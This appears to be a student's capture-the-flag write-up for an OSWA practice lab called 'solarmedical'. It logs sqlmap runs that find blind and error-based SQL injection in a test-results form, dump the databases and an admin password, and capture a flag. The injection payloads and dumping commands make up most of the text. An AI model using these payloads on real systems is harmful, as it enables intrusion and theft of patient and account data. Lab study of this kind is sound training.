# Table of Contents 
1. Initial landing splash page
2.  `SQLMAP` testing against `MAKE AN APPOINTMENT`
3.  `SQLMAP` testing `http://solarmedical/testResults` endpoint `Day 1`
4. `SQLMAP` testing `http://solarmedical/testResults` endpoint `Day 2`
## Synopsis
Browsed to `http://solarmedical:80/`, because we are dealing with a medical website I was already thinking `databases` and therefore potential `SQL`. Clicked on `Make an Appointment` & submitted `test:test` in every field to generate a `POST` request to begin testing `SQLMAP`, this didnt lead anywhere. Ended up submitting `test:test` in the `/testResults` and running `SQLMAP` - found `Micosoft SQL` `boolean-based blind` vulnerability in the `patientName` parameter and ended up getting `admin` credentials from this path. With these credentials I was able to login to the `http://solarmedical` as `admin` and grab `local.txt`
### The Complete Path (Short)
```c++
> http://solarmedical/
-> boolean-blased blind vulnerability at http://solarmedical/testResults
--> used patientName parameter to --dump-all and get admin credentials to web server
---> login with admin credentials
```
##### Lessons learned 
- Medical websites typically have Databases
- `SQLMAP` `--risk level 1-3` and `--level 1-5` present different results - should mess with them if first doesn't yield results  
- [x] Running Methodology updated with Lessons learned

---
##### Initial landing splash page
- web page at the web root
![[Pasted image 20241217121759.png]]
multiple fields to begin testing `SQL` with
##### `SQLMAP` testing against `MAKE AN APPOINTMENT`
![[Pasted image 20241217131649.png]]
didnt find any vulnerable parameters here
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 17:31:10]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]
â””â”€# sqlmap -r appt_req.txt --batch --risk=3 --level=5                                                 
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.5#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
[18:04:29] [WARNING] parameter 'Referer' does not seem to be injectable
[18:04:29] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:04:29] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 18390 times
[18:04:29] [WARNING] your sqlmap version is outdated

[*] ending @ 18:04:29 /2024-12-17/

```
##### `SQLMAP` testing `http://solarmedical/testResults` endpoint `Day 1`
![[Pasted image 20241217131745.png]]
`HTTP` request - `tstres_req.txt`
```http
POST /testResults HTTP/1.1
Host: solarmedical
Content-Length: 419
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://solarmedical
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://solarmedical/testResults
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

__VIEWSTATE=rXWmAHq7jlOO2Zd9xfa6f3c3uRlsgJZUuKbJV%2Bn6TwW0Hkxh0ZpRqkfRmno4lu2QxtT9Q5VneDrGN%2BQG76qQfFqDWEmOS6xNvV8pSLQNq9g%3D&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=1t8%2BC1OOxdMwrFNtKr6kflC6Ve8RNHhHgG5nw0wq1UgEt%2FOFpD2Za5cvc8HcchHwww5ldvtwi4P5met48YVnF8aInJ2BW%2FrUHFRl7UJE1%2F4iFcaRHbXsoARpEjZ0TV5Vl8rujie5KVnBJrHsFvWUhS2u52nSuTveuCrBHJWZyMY%3D&patientName=test&testDate=2024-12-17&viewResults=View+Results
```
sqlmap worked against the `patientName` parameter with `time-based blind` - the backend database is `Microsoft SQL Server 2022`
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 17:54:38]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                     
â””â”€# sqlmap -r tstres_req.txt --batch --risk=3 --level=1                                                                                                                              
        ___             
       __H__                                                                            
 ___ ___[)]_____ ___ ___  {1.8.5#stable}            
|_ -| . ["]     | .'| . |                      
|___|_  [(]_|_|_|__,|  _|                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                        
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers a
ssume no liability and are not responsible for any misuse or damage caused by this program                                                                                                                                                                  
[*] starting @ 18:02:42 /2024-12-17/                                                                   
[18:02:42] [INFO] parsing HTTP request from 'tstres_req.txt'                                                      
[18:02:42] [INFO] testing connection to the target URL                                                                 
do you want to automatically adjust the value of '__VIEWSTATE'? [y/N] N                                                                                                              
you have not declared cookie(s), while server wants to set its own ('ASP.NET_SessionId=qucgkjosf52...q3fxzgchxy'). Do you want to use those [Y/n] Y                                  
[18:02:42] [INFO] checking if the target is protected by some kind of WAF/IPS                                           
[18:02:42] [CRITICAL] WAF/IPS identified as 'ASP.NET RequestValidationMode (Microsoft)'                               
are you sure that you want to continue with further target testing? [Y/n] Y                                            
[18:02:42] [WARNING] please consider usage of tamper scripts (option '--tamper')                                      
[18:02:42] [INFO] testing if the target URL content is stable                                                  
[18:02:43] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case 
of junk results, refer to user's manual paragraph 'Page comparison'                                                
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C                                                
[18:02:43] [INFO] searching for dynamic content                                                                      
[18:02:43] [INFO] dynamic content marked for removal (1 region)                                                  
[18:02:43] [INFO] ignoring POST parameter '__VIEWSTATE'                                                               
[18:02:43] [INFO] ignoring POST parameter '__VIEWSTATEGENERATOR'                                                 
[18:02:43] [INFO] ignoring POST parameter '__EVENTVALIDATION'                                         
[18:02:43] [INFO] testing if POST parameter 'patientName' is dynamic         
[18:02:43] [WARNING] POST parameter 'patientName' does not appear to be dynamic
[18:02:43] [INFO] heuristic (basic) test shows that POST parameter 'patientName' might be injectable (possible DBMS: 'Microsoft SQL Server')
[18:02:43] [INFO] testing for SQL injection on POST parameter 'patientName'
it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) value? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) value? [Y/n] Y
[18:02:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:02:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:02:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:02:45] [INFO] testing 'Generic inline queries'
[18:02:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:02:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:02:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:02:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:02:45] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:02:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:02:52] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:02:53] [INFO] POST parameter 'patientName' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' injectable 
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[18:02:53] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[18:03:53] [INFO] POST parameter 'patientName' appears to be 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' injectable 
[18:03:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
POST parameter 'patientName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 200 HTTP(s) requests:
---
Parameter: patientName (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: __VIEWSTATE=rXWmAHq7jlOO2Zd9xfa6f3c3uRlsgJZUuKbJV+n6TwW0Hkxh0ZpRqkfRmno4lu2QxtT9Q5VneDrGN+QG76qQfFqDWEmOS6xNvV8pSLQNq9g=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=1t8+C1OOxdMwrFNtKr6kf
lC6Ve8RNHhHgG5nw0wq1UgEt/OFpD2Za5cvc8HcchHwww5ldvtwi4P5met48YVnF8aInJ2BW/rUHFRl7UJE1/4iFcaRHbXsoARpEjZ0TV5Vl8rujie5KVnBJrHsFvWUhS2u52nSuTveuCrBHJWZyMY=&patientName=test%' AND 1242 IN (SELECT (CHAR(113) C
HAR(98) CHAR(122) CHAR(118) CHAR(113) (SELECT (CASE WHEN (1242=1242) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(106) CHAR(118) CHAR(98) CHAR(113))) AND 'peQu%'='peQu&testDate=2024-12-17&viewResults
=View Results

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: __VIEWSTATE=rXWmAHq7jlOO2Zd9xfa6f3c3uRlsgJZUuKbJV+n6TwW0Hkxh0ZpRqkfRmno4lu2QxtT9Q5VneDrGN+QG76qQfFqDWEmOS6xNvV8pSLQNq9g=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=1t8+C1OOxdMwrFNtKr6kf
lC6Ve8RNHhHgG5nw0wq1UgEt/OFpD2Za5cvc8HcchHwww5ldvtwi4P5met48YVnF8aInJ2BW/rUHFRl7UJE1/4iFcaRHbXsoARpEjZ0TV5Vl8rujie5KVnBJrHsFvWUhS2u52nSuTveuCrBHJWZyMY=&patientName=test%' AND 3028=(SELECT COUNT(*) FROM s
ysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'QYkP%'='QYkP&testDate=2024-12-17&viewResults=View Results
---
[18:03:53] [INFO] testing Microsoft SQL Server
[18:03:53] [INFO] confirming Microsoft SQL Server
[18:03:53] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2022 or 11 or 10 or 2016
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2022
[18:03:53] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[18:03:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/solarmedical'
[18:03:53] [WARNING] your sqlmap version is outdated

[*] ending @ 18:03:53 /2024-12-17/
```
listing `databases`
```go
sqlmap -r tstres_req.txt -p patientName --dbs --batch 
[18:31:44] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 10 or 2019 or 11 or 2022
web application technology: ASP.NET, Microsoft IIS 10.0, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2022
[18:31:44] [INFO] fetching database names
[18:31:44] [WARNING] the SQL query provided does not return any output
[18:31:44] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[18:31:44] [INFO] fetching number of databases
[18:31:44] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)                                                        
[18:31:46] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[18:31:46] [ERROR] unable to retrieve the number of databases
[18:31:46] [INFO] retrieved: 
[18:31:47] [INFO] resumed: ''
[18:31:47] [INFO] falling back to current database
[18:31:47] [INFO] fetching current database
[18:31:47] [INFO] retrieved: 
[18:31:47] [CRITICAL] unable to retrieve the database names
[18:31:47] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 41 times
[18:31:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/solarmedical'
[18:31:47] [WARNING] your sqlmap version is outdated

[*] ending @ 18:31:47 /2024-12-17/

```
had to `reboot` the machine & changed level to `2` 
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 19:32:32]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]
â””â”€# sqlmap -r tstres_req5.txt --batch --risk=3 --level=2

[19:31:25] [INFO] parsing HTTP request from 'tstres_req5.txt'                                                              
[19:31:25] [INFO] testing connection to the target URL                                                                     
do you want to automatically adjust the value of '__VIEWSTATE'? [y/N] N                                                    
[19:31:25] [INFO] checking if the target is protected by some kind of WAF/IPS                                              
[19:31:26] [CRITICAL] WAF/IPS identified as 'ASP.NET RequestValidationMode (Microsoft)'                                    
are you sure that you want to continue with further target testing? [Y/n] Y                                                
[19:31:26] [WARNING] please consider usage of tamper scripts (option '--tamper')                                           
[19:31:26] [INFO] testing if the target URL content is stable                                                              
[19:31:26] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case 
of junk results, refer to user's manual paragraph 'Page comparison'                                                        
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C                                                         
[19:31:26] [INFO] searching for dynamic content                                                                            
[19:31:26] [INFO] dynamic content marked for removal (1 region)                                                            
[19:31:26] [INFO] ignoring POST parameter '__VIEWSTATE'                                                                    
[19:31:26] [INFO] ignoring POST parameter '__VIEWSTATEGENERATOR'                                                           
[19:31:26] [INFO] ignoring POST parameter '__EVENTVALIDATION'                                                              
[19:31:26] [INFO] testing if POST parameter 'patientName' is dynamic                                                       
[19:31:26] [WARNING] POST parameter 'patientName' does not appear to be dynamic                                            
[19:31:26] [INFO] heuristic (basic) test shows that POST parameter 'patientName' might be injectable (possible DBMS: 'Microsoft SQL Server')                                                               
[19:31:26] [INFO] testing for SQL injection on POST parameter 'patientName'                                                
it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y                                                                            
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server' extending provided level (2) value? [Y/n] Y                                                                           
[19:31:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                               
[19:31:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'                                                
[19:31:29] [INFO] POST parameter 'patientName' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable  
[19:31:29] [INFO] testing 'Generic inline queries'                                                                         
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                      
[19:31:29] [INFO] POST parameter 'patientName' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' injectable                                                                   
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'                                                     
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                          
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'                                
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'                                                    
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'                                          
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                              
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[19:31:29] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[19:32:29] [INFO] POST parameter 'patientName' appears to be 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' injectable 
[19:32:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:32:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:32:30] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:32:31] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'patientName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 101 HTTP(s) requests:

POST parameter 'patientName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 101 HTTP(s) requests:
---
Parameter: patientName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: __VIEWSTATE=9dRUoS+Xx/9IDLP/p5OZvmfKw8fpfjjv3NeFOu+zERFPhW/y+CKeUkwdRJ+lVaOZi8iv9+fAgygO5wfMYOkz7t/zFRUZ/Xhk3vgVDVhE+KE=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=rqBztt0pw0EV8NiNYj+jMZ2Nn4g1gTmA8jjYwCGNe6d8lh8cxhaOjWnKjjRHWoTN/Ry5PJgiYvmRbdFe4oscCSUGGMn7Irm6/KEaEZyw7uog0bV96qY1IfbR/rPxMvEQ+EepcY7Rzp8YEfO6uuMV/qqy/v9+Oifu2D80CQCQ79M=&patientName=-4830%' OR 7504=7504 AND 'ViUe%'='ViUe&testDate=2024-12-17&viewResults=View Results

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: __VIEWSTATE=9dRUoS+Xx/9IDLP/p5OZvmfKw8fpfjjv3NeFOu+zERFPhW/y+CKeUkwdRJ+lVaOZi8iv9+fAgygO5wfMYOkz7t/zFRUZ/Xhk3vgVDVhE+KE=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=rqBztt0pw0EV8NiNYj+jMZ2Nn4g1gTmA8jjYwCGNe6d8lh8cxhaOjWnKjjRHWoTN/Ry5PJgiYvmRbdFe4oscCSUGGMn7Irm6/KEaEZyw7uog0bV96qY1IfbR/rPxMvEQ+EepcY7Rzp8YEfO6uuMV/qqy/v9+Oifu2D80CQCQ79M=&patientName=testing%' AND 8422 IN (SELECT (CHAR(113) CHAR(98) CHAR(113) CHAR(120) CHAR(113) (SELECT (CASE WHEN (8422=8422) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(106) CHAR(113) CHAR(106) CHAR(113))) AND 'dFXg%'='dFXg&testDate=2024-12-17&viewResults=View Results

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: __VIEWSTATE=9dRUoS+Xx/9IDLP/p5OZvmfKw8fpfjjv3NeFOu+zERFPhW/y+CKeUkwdRJ+lVaOZi8iv9+fAgygO5wfMYOkz7t/zFRUZ/Xhk3vgVDVhE+KE=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=rqBztt0pw0EV8NiNYj+jMZ2Nn4g1gTmA8jjYwCGNe6d8lh8cxhaOjWnKjjRHWoTN/Ry5PJgiYvmRbdFe4oscCSUGGMn7Irm6/KEaEZyw7uog0bV96qY1IfbR/rPxMvEQ+EepcY7Rzp8YEfO6uuMV/qqy/v9+Oifu2D80CQCQ79M=&patientName=testing%' AND 8665=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'xnam%'='xnam&testDate=2024-12-17&viewResults=View Results
---
[19:32:31] [INFO] testing Microsoft SQL Server
[19:32:32] [INFO] confirming Microsoft SQL Server
[19:32:32] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 11 or 2019 or 2016 or 2022
web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
back-end DBMS: Microsoft SQL Server 2022
[19:32:32] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[19:32:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/solarmedical'

```
we found that `patientName`  was vulnerable - lets dump `databases`
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 19:32:32]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                    
â””â”€# sqlmap -r tstres_req5.txt --batch --risk=3 --level=2 --dbs        
Parameter: patientName (POST)                                                                                                                                                                              
    Type: boolean-based blind                                                                                                                                                                              
    Title: OR boolean-based blind - WHERE or HAVING clause                                                                                                                                                 
    Payload: __VIEWSTATE=9dRUoS+Xx/9IDLP/p5OZvmfKw8fpfjjv3NeFOu+zERFPhW/y+CKeUkwdRJ+lVaOZi8iv9+fAgygO5wfMYOkz7t/zFRUZ/Xhk3vgVDVhE+KE=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=rqBztt0pw0EV8NiNYj+jM
Z2Nn4g1gTmA8jjYwCGNe6d8lh8cxhaOjWnKjjRHWoTN/Ry5PJgiYvmRbdFe4oscCSUGGMn7Irm6/KEaEZyw7uog0bV96qY1IfbR/rPxMvEQ+EepcY7Rzp8YEfO6uuMV/qqy/v9+Oifu2D80CQCQ79M=&patientName=-4830%' OR 7504=7504 AND 'ViUe%'='ViUe&
testDate=2024-12-17&viewResults=View Results                                                                                                                                                               

    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: __VIEWSTATE=9dRUoS+Xx/9IDLP/p5OZvmfKw8fpfjjv3NeFOu+zERFPhW/y+CKeUkwdRJ+lVaOZi8iv9+fAgygO5wfMYOkz7t/zFRUZ/Xhk3vgVDVhE+KE=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=rqBztt0pw0EV8NiNYj+jMZ2Nn4g1gTmA8jjYwCGNe6d8lh8cxhaOjWnKjjRHWoTN/Ry5PJgiYvmRbdFe4oscCSUGGMn7Irm6/KEaEZyw7uog0bV96qY1IfbR/rPxMvEQ+EepcY7Rzp8YEfO6uuMV/qqy/v9+Oifu2D80CQCQ79M=&patientName=testing%' AND 8422 IN (SELECT (CHAR(113) CHAR(98) CHAR(113) CHAR(120) CHAR(113) (SELECT (CASE WHEN (8422=8422) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(106) CHAR(113) CHAR(106) CHAR(113))) AND 'dFXg%'='dFXg&testDate=2024-12-17&viewResults=View Results

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
    Payload: __VIEWSTATE=9dRUoS+Xx/9IDLP/p5OZvmfKw8fpfjjv3NeFOu+zERFPhW/y+CKeUkwdRJ+lVaOZi8iv9+fAgygO5wfMYOkz7t/zFRUZ/Xhk3vgVDVhE+KE=&__VIEWSTATEGENERATOR=FB903339&__EVENTVALIDATION=rqBztt0pw0EV8NiNYj+jMZ2Nn4g1gTmA8jjYwCGNe6d8lh8cxhaOjWnKjjRHWoTN/Ry5PJgiYvmRbdFe4oscCSUGGMn7Irm6/KEaEZyw7uog0bV96qY1IfbR/rPxMvEQ+EepcY7Rzp8YEfO6uuMV/qqy/v9+Oifu2D80CQCQ79M=&patientName=testing%' AND 8665=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'xnam%'='xnam&testDate=2024-12-17&viewResults=View Results
---
[19:34:35] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 2016 or 2019 or 11 or 10
web application technology: ASP.NET, Microsoft IIS 10.0, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2022
[19:34:35] [INFO] fetching database names
[19:34:35] [INFO] fetching number of databases
[19:34:36] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[19:34:36] [INFO] retrieved: 5
[19:34:36] [INFO] retrieved: MedicalDB
[19:34:39] [INFO] retrieved: model
[19:34:41] [INFO] retrieved: msdb
[19:34:42] [INFO] retrieved: tempdb
[19:34:45] [INFO] retrieved: 
[19:34:45] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                   
[19:34:47] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[19:34:47] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
available databases [4]:
[19:34:47] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
available databases [4]:
[*] MedicalDB
[*] model
[*] msdb
[*] tempdb

```
looking into `MedicalDB` first and dumping `tables`
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[10Dec2024 04:30:33]-[/home/â€¦/SUT/OSWA/challenge_labs/piano_protocol]               
â””â”€# sqlmap -r tstres_req5.txt -p patientName -D MedicalDB --tables --batch    
```
looks like adding the `-p patientName` is giving a `500` error have to use without - took away the `-p` and it worked
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 19:40:42]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                      
â””â”€# sqlmap -r tstres_req5.txt -D MedicalDB --tables --batch    
Database: MedicalDB
[5 tables]
+--------------+
| Appointments |
| Patients     |
| TestResults  |
| TestTypes    |
| Users        |
+--------------+
```
now attempting to list the `columns` in the `Users` table
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[10Dec2024 04:31:16]-[/home/â€¦/SUT/OSWA/challenge_labs/piano_protocol]               
â””â”€# sqlmap -r tstres_req5.txt -D MedicalDB -T Users --columns --batch
```

```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 19:40:42]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                      
â””â”€# sqlmap -r tstres_req5.txt -D MedicalDB --tables --batch    
Database: MedicalDB
[5 tables]
+--------------+
| Appointments |
| Patients     |
| TestResults  |
| TestTypes    |
| Users        |
+--------------+
```

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 19:47:27]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                 
â””â”€# sqlmap -r tstres_req5.txt -D msdb --tables --batch    
Database: msdb
[23 tables]
+--------------------------------------------+
| autoadmin_backup_configuration_summary     |
| backupfile                                 |
| backupmediafamily                          |
| backupmediaset                             |
| backupset                                  |
| dm_hadr_automatic_seeding_history          |
| logmarkhistory                             |
| restorefile                                |
| restorefilegroup                           |
| restorehistory                             |
| suspect_pages                              |
| sysdac_instances                           |
| syspolicy_conditions                       |
| syspolicy_configuration                    |
| syspolicy_object_sets                      |
| syspolicy_policies                         |
| syspolicy_policy_categories                |
| syspolicy_policy_category_subscriptions    |
| syspolicy_policy_execution_history         |
| syspolicy_policy_execution_history_details |
| syspolicy_system_health_state              |
| syspolicy_target_set_levels                |
| syspolicy_target_sets                      |
+--------------------------------------------+

```
got credentials for `admin` user by strictly guessing the `column` names `username,password` - the `SQL` database was screwed up and was not properly dumping the `column` names
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[17Dec2024 20:26:22]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                  
â””â”€# sqlmap -r tstres_req5.txt -p patientName -D MedicalDB -T Users -C username,password --dump --batch   
[20:26:27] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 11 or 2016 or 10 or 2019 or 2022
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2022
[20:26:27] [INFO] fetching entries of column(s) 'password,username' for table 'Users' in database 'MedicalDB'
[20:26:27] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
[20:26:27] [INFO] resumed: '1'
[20:26:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:26:28] [INFO] resumed: '1'
[20:26:28] [INFO] fetching number of distinct values for column 'password'
[20:26:28] [INFO] resumed: '1'
[20:26:28] [INFO] using column 'password' as a pivot for retrieving row data
[20:26:28] [INFO] resumed: 'TLyjybuktHmL3J9qadfV'
[20:26:28] [INFO] resumed: 'admin'
Database: MedicalDB
Table: Users
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| admin    | TLyjybuktHmL3J9qadfV |
+----------+----------------------+

[20:26:28] [INFO] table 'MedicalDB.dbo.Users' dumped to CSV file '/root/.local/share/sqlmap/output/solarmedical/dump/MedicalDB/Users.csv'
[20:26:28] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[20:26:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/solarmedical'

[*] ending @ 20:26:28 /2024-12-17/

```
`local.txt` 2e33ec6303b3a5dfcadc42d0d17a5b91
![[Pasted image 20241217153653.png]]

##### `SQLMAP` testing `http://solarmedical/testResults` endpoint `Day 2`
testing the `POST` request for `Test Results` 
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[18Dec2024 13:26:22]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]                                      
â””â”€# sqlmap -r tstres_req1_day2.txt --batch --risk=3 --level=2 --dbs 
        ___                                                                                            
       __H__                                              
 ___ ___[)]_____ ___ ___  {1.8.12.2#dev}                                                                       
|_ -| . [(]     | .'| . |                                                                     
|___|_  ["]_|_|_|__,|  _|                                        
      |_|V...       |_|   https://sqlmap.org  
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                                                                      
